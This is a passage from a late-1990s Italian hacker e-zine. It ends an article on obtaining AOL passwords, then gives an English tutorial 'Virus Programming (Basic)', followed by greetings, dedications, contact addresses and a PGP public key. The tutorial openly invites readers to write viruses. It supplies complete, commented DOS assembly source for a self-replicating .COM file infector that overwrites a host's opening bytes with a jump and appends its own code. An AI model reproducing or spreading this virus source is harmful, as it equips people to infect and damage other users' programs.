POSSANO RECARE CON QUESTO EXPLOIT ALL'AOL Central Computer :):)

Dopo aver finito il tutto avete avuto la vostra bella password con molta
semplicita', buona fortuna a tutti.
Spero che quando leggerete qesto articolo questo meccanismo funzioni ancora
altrimenti provate a trovare qualche aggiornamento di questo articolo :):)

                                                                By XuNiL
                                                             ^The Operative^


ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

             >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
             >                                                >
             >      ----- Virus Programming (Basic)-----      >
             >                                                >
             >             by XaRaBaS [l1ghtz]                >
             >                                                >
             >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

    This section is dedicated to those who would like to write a
   virus, but don't have the knowledge to do so.  First of all,
   writing a virus is no big deal.  It is an easy project, but one
   which requires some basic programming skills, and the desire to
   write a virus!  If either of these is missing, writing a virus
   would be tedious indeed!.
    
    Well, if you meet these requisites, keep reading this article....
    
                  JE   READ
                  JNE  FUCK_YOU!
   READ:
    
    The survival of a virus is based in its ability to reproduce.  "So
   how the fuck do I make a program reproduce?", you might ask.
   Simple, by getting it to copy itself to other files....
    
    The functional logic of a virus is as follows:
    
    1- Search for a file to infect
    2- Open the file to see if it is infected
    3- If infected, search for another file
    4- Else, infect the file
    5- Return control to the host program.
    
    The following is an example of a simple virus:
    
   ;****************************************************************
   ;                         START OF THE EXAMPLE:
   ;****************************************************************
   ;Warning, this example is a (piece of shit?)
   ; - The virus does not test for prior infection
   ; - it searches only for the first .COM file in the current
   ;   directory
   ;
   ; Careful when executing this file, since the first time it's
   ; executed it will search for and infect the first file in the
   ; directory.  If we later run the newly infected file, it will find
    
   ; the first file in its directory, itself.  Thus, it will re-infect
    
   ; itself over and over.
   ;===================CODIGO=======================================
   ;(The variables in a .COM file are relative to offset 100h).
    
   codigo  segment 'code'
        org 100h                 ;Organize all the code starting
                                 ; from offset 100h
        assume cs:codigo,ds:codigo,es:codigo    ;Define the use of the
                                                ;segments
    
   start   proc far                   ;Start the routine
   COMIENZO:
        push    cs                    ;Store  CS
        push    cs                    ;Store  CS
                                 ; once again.
        pop     ds                    ;Bring DS out from stack
        pop     es                    ;Bring ES out from stack
    
        call    falso_proc            ;Call proc. so that its
                                 ; address is placed in the stack
   falso_proc      proc near
   falso_proc      endp
    
        pop     bp                    ;BP<== Proc. address.
        sub     bp, 107h              ;BP<== BP - Previous directory
    
   ;This is done to take the variables relative to BP, since the
   ;infection displaces the variables at exactly the length of the
   ; file.  At the first infection, instruction "SUB BP, 107h" is
   ; 107h, so that the contents of BP is 0;  when I call a variable
   ; with "BP+VARIABLE"  the value of the variable's address is not
   ; modified.  When I load it , for example, from a 100h byte
   ; infected file, the instruction "SUB BP, 107h" leaves me at
   ; address 207h which means BP=100h, the size of the original file.
   ; Had I called the variable without adding BP, I would have been
   ; short by 100h bytes.
    
   ;Find the first .COM file in the directory
   -----------------------------------------
        mov     ah, 4eh                    ;Search for the 1st file
        lea     dx, bp+file_inf            ;DS:DX= offset of FILE_INF
                                 ;(*.*) so it will search all
                                 ;the files, including directory
                                 ;names with extensions.
        mov     cx, 0000h             ;Entry attributes
        int     21h
    
   ;These attributes mentioned in the commentary are the directory's
   ; entry attributes.  When I set the attributes to 0, I'm telling
   ; DOS to search normal files.  If I include a bit combination which
    
   ; provides the Hidden, System or Directory attributes, DOS will
   ; search for files with those attributes, as well as the normal
   ; files.  If the search range includes the Volume bit, the search
   ; is limited to that.
    
   ;These are the bits which correspond to each attribute:
   ;Bits:    7 6 5 4 3 2 1 0
   ;         . . . . . . . 1          Bit 0: Read only
   ;         . . . . . . 1 .          Bit 1: Hidden
   ;         . . . . . 1 . .          Bit 2: System
   ;         . . . . 1 . . .          Bit 3: Volume
   ;         . . . 1 . . . .          Bit 4: Directory
   ;         . . 1 . . . . .          Bit 5: File
   ;
   ;Bits 6 and 7 are not used as they are reserved for "future
   ; applications".
    
   ;Open file
   ;----------------------------------------------------------------
        mov     ah, 3dh                    ;Open the file.
        mov     al, 00000010b              ;read/write.
        mov     dx, 009eh             ;DX<== DTA(filename) offset
        int     21h                        ;put the handle in AX
        push    ax                         ;and store in stack.
    
   ;The attributes I'm setting in AL are not the same as before.
   ; These are the "open" attributes.  We are only interested in the
   ; first 3 bits,
    
   ;bits 2 1 0:
   ;
   ;     0 0 0          Read only mode
   ;     0 0 1          Write only mode
   ;     0 1 0          Read/Write mode
   ;
   ;OK, we now have the file attributes stored in AL.  What we now
   ; need to do is to store in DX the offset of the variable where
   ; I've stored the ASCIIZ chain with the name of the file to be
   ; opened.  In this case, we don't have a NAME_OF_FILE variable.
   ; Instead, the name is located in the DTA (Disk Transfer Area).  I
   ; we have it in the DTA......   Why?  Simply because when we search
   ; for a file to infect, all the information we need is returned to
   ; this memory area.  This buffer, if it was not reset, is found in
   ; the PSP; more precisely, it starts at offset 80h and is 43d bytes
   ; in size.
   ;
   ;The DTA format is as follows:
   ;
   ;Offset        Bytes          Function
   ; 00h           21d      Used by DOS for the 4fh service
   ;                        (search for the next file)
   ; 15h           01d      Attributes of the file that's been found
   ; 16h           02d      File time
   ; 18h           02d      File date
   ; 1Ah           04d      File size in bytes
   ; 1Eh           13d      File name in an ASCIIZ chain
   ;                        (FILENAME.EXT),0
   ;
   ;Well, all that remains to be doe is to give DX the position in
   ; memory where I've stored the filename:  "MOV DX, E1h" and its's
   ; done.  But careful now, remember that DTA starts at offset 80h,
    
   ; which means I have to pass to DX the value "80h+1Eh = 9Eh".  That
    
   ; would than leave "MOV DX, 9Eh"; the problem is solved.  Now you
   are probably asking yourselves what I mean by "handle".  The handle
   is a number which tells DOS which file we want.  DOS gives us a
   handle for each file we open so we have to be careful to have the
   correct handle for each file which we read/write.
    
   ;Read the first 3 bytes.
   -----------------------------------------------------
        pop     bx                    ;I take the handle from the
                                      ;stack to BX
        push    bx                    ;and I store it again.
        mov     ah, 3fh               ;Read file.
        mov     cx, 0003h             ;Read 3 bytes.
        lea     dx, bp+buffer            ;and store in the buffer.
        int     21h
    
   INFECTAR:                          ;(infect)
   ;Move pointer to the start.
   ---------------------------------------------------
        mov  ax, 4200h           ;I move the write pointer
                                 ;to the beginning of the program
        mov     cx, 0000h
        mov     dx, 0000h
        int     21h
    
   ;The pointer's displacement, relative to the position of the
   ; pointer as specified in AL, is placed in CX and DX.
   ; Pointer displacement modes set in AL:
   ;    AL <== 00 Move pointer to the beginning of the file.
   ;    AL <== 01 leave pointer where it is.
   ;    AL <== 02 Move pointer to end-of-file.
    
   ;Write the first byte (jmp)
   -------------------------------------------------
        mov     ah, 40h                    ;write the first byte.
        mov     cx, 1d                ;Quantity=1.
        lea     dx, bp+jump           ;DX<== JUMP offset
        int     21h
    
   ;(Here we still need the handle, but we don't need to set it again
   ; because the register which contained the information was not
   ; modified.
   ;
   ;The first byte to be written is a JUMP instruction (the symbol for
    
   ; the jump is below).  What follows the jump is the address of the
   ; jump, file-length + 1.  (test the "+ 1" thoroughly, since this
   ; can cause problems; if so, multiply by 18 or subtract 23.)
   ; Hehehehe.
   ;Since the entire virus code is copied at the end of the file, the
   ; jump gives the virus control in an infected file.
    
   ;Calculating file length
   -------------------------------------------------
        mov     cx, 2                 ;Copy 2 bytes.
        mov     si, 009ah             ;SI<== DTA offset
        lea     di, bp+longitud            ;DI<== File LENGTH offset.
        rep     movsb                 ;Copy.
    
    
   ;This instruction must have the 'SOURCE' buffer address in DS:SI
   ; and the address where the string will be copied in ES:DI (in this
    
   ; case, I copy the file length of the DTA to the variable
   ; 'LONGITUD').
    
        sub  word ptr [bp+longitud], 3     ;subtract 3 bytes from
                                           ;[LONGITUD]
    
   ;The JMP is completed
   --------------------------------------
        mov     ah, 40h                    ;Write.
        mov     cx, 2d                          ;Number of bytes.
        lea     dx, bp+longitud            ;DX<== LONGITUD (length)
                                           ; offset
        int     21h
    
   ;Move pointer to end
   -------------------------------------------------------
        mov  ax, 4202h           ;Move the write pointer to the
                                 ;end of the program.
        mov     cx, 0000h
        mov     dx, 0000h
        int     21h
        add  word ptr [bp+longitud],3 ;Restore LONGITUD.
    
   ;Copy the virus to the program.
   ---------------------------------------------------
        pop     bx                    ;Restore the handle.
        mov     ah, 40h
        mov     cx, 190d              ;number of bytes to copy.
        lea  dx, bp+comienzo               ;Start copying from....
        int     21h
    
   ;Close the file after infection
   ------------------------------------
        mov     ah, 3eh                    ;Close file.
        int     21h
    
   ;Here, too, we need in DS:DX the address of the buffer which
   ; contains the filename string, but in this case DS and DX already
   ; contain those values from before.
    
   NO_INFECTAR:
    
   ;==================RETURN CONTROL TO THE HOST=====================
   ;Copy the buffer which contains the first 3 bytes of the file into
   ; memory.
   ------------------
        mov  cx, 0003h           ;Number of bytes (3).
        mov  di, 0100h           ;DI<== offset 100h. Beginning of the
                                 ;program in memory.
        lea  si, bp+buffer            ;SI<== BUFFER offset
        rep  movsb                    ;Copy.
    
   ;What we are doing here is to "fix" the file, since when it was
   ; infected, the first few bytes are overwritten by the virus.  That
    
   ; is why we reconstruct the file to its original state, by copying
   ; the first 3 bytes, which we had stored earlier, into memory.
    
   ;Jump to offset 100h
   --------------------------------------------------------
    
        mov  ax, 0100h           ;Address needed to execute the host
        jmp  ax
    
   ;As we mentioned before, in .COM files the executable code begins
   ; at offset 100h.  The information found between 00h and 100h is
   ; program data, like the DTA for example.
    
   ;The main difference between a .COM file and an .EXE is that a .COM
   ; cannot occupy more than one memory segment, or 65535 bytes.
   ; .EXEs can, because DOS can 'tailor' them to fit into a number of
   ; different segments.  Unlike.EXE files. .COM files are faithful
   ; reproductions of the contents of memory.
    
   ;====================DATA AREA===================================
    
   buffer         db 7d dup(0)
   longitud       db 2 dup(0)
   file_inf       db '*.COM',0
   jump           db 'e'',0       ;<----jump ascii
    
   ;(The character '0' is the end of the ASCIIZ string)
    
   start     endp                     ;End of main procedure
   codigo  ends                       ;end of code segment
   end     comienzo                   ;END. Go to  COMIENZO
    
   ;****************************************************************
   ;                              END OF EXAMPLE
   ;****************************************************************
                                 XaRaBaS 1999

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

    _   _               ____  _
   | \ | | _____      _| __ )(_) ___ ___
   |  \| |/ _ \ \ /\ / /  _ \| |/ _ Y __|
   | |\  |  __/\ V  V /| |_) | |  __|__ \
   |_| \_|\___| \_/\_/ |____/|_|\___|___/
   
   Redattori ------------> N0bodY88 & ZeroCool & Dante Alighieri
   E-zine by ------------> N0bodY88 & ZeroCool & Dantuzzo & NewBies Staff
   Ascii by -------------> N0bodY88 & |-|15cR4zYm1nD & S0l1t4r10~M4N
   Loghi NewBies by -----> RigoR MorteM
   Articoli -------------> NewBies Staff & Friends

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                          ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                          ÷ִִִִִִִִִִִִִִִִִ¿÷
                          ÷³      SALUTI     ³÷
                          ÷ְִִִִִִִִִִִִִִִִִ÷
                          ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

Dante Alighieri SALUTA: Adryana smav Sharra14 lalli82 MsBLiSs^ Pollici

\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

N0bodY88 SALUTA: (li ordino x gruppi se no faccio doppioni come nel 1ר num...)

tutto il NewBies Staff ctra cui Zerocool, Dante Alighieri, Devilnet, Harlok,
                    Blinking, Master, Firebeam, aLT255, Quequero, +MaLaTTiA,
                    Cod, Ritz, Johnny, Ironman, [-W|nz-], _p0nic0_, Nick1,
                    mR_bIs0n-Mr_Skull, Rez, Avogrado, Zippy2k, Dark_elf,
                    DeviLNeT, JohnnyRunner, Barninga Z!, rwxrw-r-x, The
                    Intruder, XuNiL, |CyRaX|, M4VER1CK, Vejeta, F3D3R1[0,
                    Ax1s, XaRaBaS, r3b0ot, Darkside, Lord Destruction, Vecna,
                    Ja[3]Ck, Zinco, Vulcan,Blum, Ron|n, Urkes, SkHammer,
                    Avatar666, ElectroRipper, Nietzsche, Spymaster, Rafcrash,
                    ZioFill, Darkman, Ramesse, Wurzel, Fusyllo, [Akuma],
                    Nemesis, Ghimlet, Sorrow The Prince, Meew, Fritz, Alby,
                    Sciaman, Game, Lopks, ©ipLey, Killex, Neural Noise,
                    Pusillus, Kill3xx, S2, Frensis, GCC, Alpha-666, Kalidor,
                    Velvet, Vaffa, ~ׁaBat½ha, Tetofuck, Pankrazio, McFly,
                    Sepiroth, SoftWord, Hamelin, Brusto, Anti-social, [max],
                    StuZzik0&|bLeaH, BlackDruiD, Z10-K41i, \JusTme\, St0rM
                    BriNgeR, Ennaro, Mr Skull, S_A_S_H_A, Devil_666, Carnifex,
                    KarmA_YogA, Pippol Calo' e a tutti quelli che ho dimentica
                    to {|:D

tutti gli Spippolatori ed in particolare RigoR MorteM, Master, Wurzel, Teresa
                    Canis, X-Hacker, Harlock,  Misha, ChRoMe, ADaM, Tira, 
                    F14m3r, Brigante, Fritz, Buttha, Azathoth, NighTiger,
                    AntoMar, erGoline, SirPsychoSexy, Harlock, Jamil :),
                    Conte Stefy Rainer, Baccoz, Hackmore, Chrome e i suoi
                    due simpaticcissimi amici

tutti quelli di BFI ed in particolare \sPIRIT\, Black Berry, Blinking, Vanadio,
                    Cavallo, Smaster, Belfaghor, Fusys, Nelloz, (gli ultimi 4
                    conosciuti allo smau e posso conferma..sono dei miti :DD)

tutti quelli di Systemdown in particolare Ragged Robin e Infected machine

tutti quelli della crew NoUseFoRaNamE, Mimmo, Nitro THe DeMoN, Simone,
                    Stramegamerz, tutti quelli che vengono col treno e si
                    leggono i miei manuali e anke quelli con cui ci si fuma
                    le cicche in bagno alla faccia del GrEeNjAgUaRoLdMeN.
                    TE LO BRUCIO IO IL BMW =) HIHIHIHIHIHIHIHIHIHIHIHIHI

tutti gli altri ed in particolare NO SPAM, Meimi, Black Baron, Zelig,
                    Newbie 1.0, Luna, Mayhem, Maniac666, Dr_Slump, Lupo,
                    Adriana, raul, A-SyNcHrO, BlackJAM, Linux, Nt Flander,
                    L0rdFelix, Antirez, Awgn, Li-nux, w00w00, lo Smilzo,
                    _hola_, Lord Guf, Li-nux, Oldiron 61, Bobo, Lando e
                    tutti quei grandi degli Attila Hack e del Wannabe Staff,
                    ^Acidburn, war-lock, Nyarlothe, Azim, NaiL_d0d, ]s4TsYN[,
                    `dize`, Napo, NikDH, Jammina e Esponential Force.

\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

            ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
            ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
            ÷³    THIS NUMBA IS DEDICATED BY N0bodY88 TO:     ³÷
            ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
            ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

[ harlok e blinking... x la folle nottata passata fuori (anke di testa!!!) ]
[ avogrado... se all'esame dico avogrado invece di avogardo dopo t'accid!! ]
[ spymaster... x il suo compleanno... ora possiamo tirargli le orecchie !  ]
[ l0rd destruction aka l0rdo... buon compleanno e scusa il ritardo ;)      ]
[ m0f0z... nel bene e nel male eri uno di noi... x noi sei ancora in rete  ]
[ black berry... xche' nessuno ti potra' mai fermare...                    ]
[ andrea monti... x tutto quello che ha fatto e sta facendo x noi...       ]
[ rigor mortem... x l'occasioni date a me ed agli altri newbies...         ]
[ badcluster... aspettiamo tutti un tuo ritorno... noi ci trovi sempre qua ]
[ \sPIRIT\... x il fantastico libro Linguaggio Assembler Avanzato...       ]
[ Andrea Monti.. x cio' che mi ha detto e xche' conosceva NewBies =======) ]
[ mayhem, nt, chrome... x il droga-alcool-pizza party la notte dello smau  ]
[ la cameriera della pizzeria dove e' avvenuto il fatto sopra... veryfiga! ]
[ tutti quelli conosciuti e/o rivisti allo smau... quando the next time??  ]
[ master...xche' ci rifornisce sempre di ottimi articoli e xche' esiste ;) ]
[ nitro the demon...xche' spero me dia na mano agli esami e in asmdober... ]
[ mimmo... aaaaallllllllllllaaaa ccccooonnnnssssoooooooooooooooollllll.... ]

|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-_-|-

Fine e-zine: purtroppo questa volta come le altre siamo giunti alla fine di
questa e-zine. Sperando che gli articoli siano piaciuti e abbiano potuto dare
una mano, uno spunto o anke solo una dritta a qualcuno di voi noi ci
congediamo (io in particolare che sto scrivendo =) ehehe ) lasciandovi con
un pezzo della canzone Imagine del sempremitico John Lennon...
    
                      "U may say I'm a dreamer...
                       but I'm not the only one..."
                  In memory of our friend John Lennon

 N0bodY88 a really really newbies and a proud member of NewBies Staff 

PS: io conto di rivedervi al prox numero della e-zine...non mancate ;)
PSS: x chi volesse scriverci ricordo che la mia mail e' n0body88@freemail.it
     e quella di dante e' dantuz@freemail.it
PSSS: x chi volesse scrivermi ma si sentisse..come dire..braccato..ecco la mia
     public key di pgp...anke se...chi volete che mi scriva ;)

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0 for non-commercial use <http://www.pgp.com>

mQGiBDfs8loRBADKshBc++QyN0pDdMwSrbw/inzCpAOiVE9IEbQOQFydr3UwrQrj
7rXgAY6VaILsYRxvw2t6oFRnU+qjcfGCWqimYurNAUx89s6VhapSGk76zxKv+AFD
4eRwP14VbNyAprFwkRhJGek/ggyL/qXDy+HopCREz76iOn4MedQjG1Lv3wCg/5e2
GVk2D67pe52QQm8KAeDxGAkEAJaXuE3dVYKzpGV1zVY40/zZivOfo/ooOZJw9CVo
tcN89J7lnDYnCKV7joYRPJBWGcQv5e+4Vwv6YShxeB9lGx/SmVIjciLjFi+IdjjM
ILZyxTS5xHUkCrO8Ojv9Wcl/Qmc2VIs08gRopjyBPQcUxpmR1rneKDpz/NS7GTCr
zudvA/9IwvgDxKwxbJBw0V4lSt2Owg8ueZ8c57+2/Vn5HUBm8g1BimZaEf3hhaZ0
sjJzBHvAMiZ5Qz/YdK36FYMbNj8Dy2zVo0G5Oy2rzdTYFZQ52tglzs628u4afAeo
0Nr5Bd5kAmt0viE1/F1VMhAbIJ1Uz1iDuppOscYTOP3EsPis77QfTjBib2RZODgg
PG4wYm9keTg4QGZyZWVtYWlsLml0PokASwQQEQIACwUCN+zyWgQLAwIBAAoJEJaw
l57ZXoLVuuUAnRbRFaT67f9CexKFQgSWBnKbXRm7AKD/JvBx+Tkpyf8lb6sK7mx1
MvV067kDDQQ37PJaEAwAzB13VyQ4SuLE8OiOE2eXTpITYfbb6yUOF/32mPfIfHmw
ch04dfv2wXPEgxEmK0Ngw+Po1gr9oSgmC66prrNlD6IAUwGgfNaroxIe+g8qzh90
hE/K8xfzpEDp19J3tkItAjbBJstoXp18mAkKjX4t7eRdefXUkk+bGI78KqdLfDL2
Qle3CH8IF3KiutapQvMF6PlTETlPtvFuuUs4INoBp1ajFOmPQFXz0AfGy0OplK33
TGSGSfgMg71l6RfUodNQ+PVZX9x2Uk89PY3bzpnhV5JZzf24rnRPxfx2vIPFRzBh
znzJZv8V+bv9kV7HAarTW56NoKVyOtQa8L9GAFgr5fSI/VhOSdvNILSd5JEHNmsz
bDgNRR0PfIizHHxbLY7288kjwEPwpVsYjY67VYy4XTjTNP18F1dDox0YbN4zISy1
Kv884bEpQBgRjXyEpwpy1obEAxnIByl6ypUM2Zafq9AKUJsCRtMIPWakXUGfnHy9
iUsiGSa6q6Jew1XpTDJvAAICC/9E+BxFTgNDfSS2y4wMkCKS23nwaf/743XZvFro
n2YLj4h5Y8/9GrqZohiCpG8jh3v2Cl7akibr6GyyFGA/IGTO1ulNBk/QnMA915ew
b2xpizQ5YWtWjHPJe/CHFE9YlKTfIDNj40kJqTs+n8UK5Va0QLkQfyF3kXrN/xLk
lPUWQ0iHWEw5loLa8oty9gkXmyPeC+9pKpYafwTgFIR75AsXZPOMOQI5EK41TCUG
ZsEjndbQfJDz0lhJ0imexDPcJm5duTQB/jJ0Q3Xcwcf5FPvQIhI5QbREBn/r3jm4
2wPpZpX3QX8JFuUyD8WSw9eMWkAMhN544ecCdZVkSnncBWoBAs/M0WJbGUOh/Q3v
Y4ryL7rEIrbfI9tsTid7U+bUSkniEP+BM4RvpwI/y0cbYk9sKoj0HqMEOGFUbu2i
rrQXsmHFpMvZovZ/ZngrPrUoDBpV8nockT7v7AfLmv7rZ8AEZyQIf1FZUneMDdU9
2TY3EPjpWv8tAbpBJKYOI1b8nQGJAEYEGBECAAYFAjfs8loACgkQlrCXntlegtWj
VACfRCK10caFI1sRJWTgwFSNXBLhhW4An3wV7C2cuQ05p2DrgcHeXwgcpro/
=lCm/
-----END PGP PUBLIC KEY BLOCK-----


...
chi arriva qui leggendo tutto e tutto d'un fiato vince un weekend di
distruzione totale a casa di N0bodY88
...
sconsigliato ai deboli di cuore
...
in caso di okkupazione "indebita" della casa da parte dei miei, il
destruction party avvera' in casa di dante (tanto non glielo ho ancora
detto =)
...
hihihi
